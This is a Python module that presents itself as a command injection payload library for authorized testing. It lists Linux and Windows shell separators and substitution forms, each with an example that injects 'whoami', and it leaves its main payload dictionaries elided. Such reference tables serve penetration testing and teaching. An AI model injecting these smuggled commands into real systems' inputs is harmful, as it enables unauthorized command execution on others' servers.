"""
Command Injection Payload Templates Database
Educational payload library for authorized security testing
"""

# Command separators by OS
SEPARATORS = {
    'linux': {
        'semicolon': {
            'char': ';',
            'description': 'Sequential command execution',
            'example': '; whoami',
            'context': 'Most common separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute second command if first succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute second command if first fails',
            'example': '|| whoami',
            'context': 'Error handling bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe output to next command',
            'example': '| whoami',
            'context': 'Output redirection'
        },
        'newline': {
            'char': '\n',
            'description': 'Line break command separator',
            'example': '\nwhoami',
            'context': 'Multi-line injection'
        },
        'backtick': {
            'char': '`',
            'description': 'Command substitution (deprecated)',
            'example': '`whoami`',
            'context': 'Inline command execution'
        },
        'dollar_paren': {
            'char': '$()',
            'description': 'Modern command substitution',
            'example': '$(whoami)',
            'context': 'Preferred substitution method'
        }
    },
    'windows': {
        'ampersand': {
            'char': '&',
            'description': 'Sequential command execution',
            'example': '& whoami',
            'context': 'CMD separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute if previous succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute if previous fails',
            'example': '|| whoami',
            'context': 'Error bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe to next command',
            'example': '| whoami',
            'context': 'Output piping'
        },
        'caret': {
            'char': '^',
            'description': 'Escape character / line continuation',
            'example': 'who^ami',
            'context': 'Character escaping'
        }
    }
}

# Base payload templates
PAYLOADS = {
    # ... (rest of ali’s payload templates unchanged)
}

CONTEXT_PAYLOADS = {
    # ... (unchanged)
}

def get_payloads(os_type='linux', category='basic'):
    if os_type not in PAYLOADS:
        return []
    if category not in PAYLOADS[os_type]:
        return []
    return PAYLOADS[os_type][category]

def get_separators(os_type='linux'):
    return SEPARATORS.get(os_type, {})

def get_context_payloads(context='parameter'):
    return CONTEXT_PAYLOADS.get(context, {})

def list_all_categories(os_type='linux'):
    if os_type not in PAYLOADS:
        return []
    return list(PAYLOADS[os_type].keys())

# Educational notes and constants remain untouched
